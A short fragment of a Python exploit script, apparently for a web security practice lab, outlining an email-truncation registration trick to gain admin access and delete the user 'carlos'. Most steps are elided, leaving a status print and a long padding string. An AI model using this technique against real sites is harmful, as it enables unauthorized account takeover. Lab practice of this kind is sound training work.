"""
    ...
    2. Register a new user with email truncation (wildcard + long prefix)
    ...
    6. Delete 'carlos' user from admin panel
...
def main():
    ...
    print(f"{Fore.YELLOW}Registering new user with malicious email...{Fore.RESET}")
    offset = f"{OFFSET}" * 238
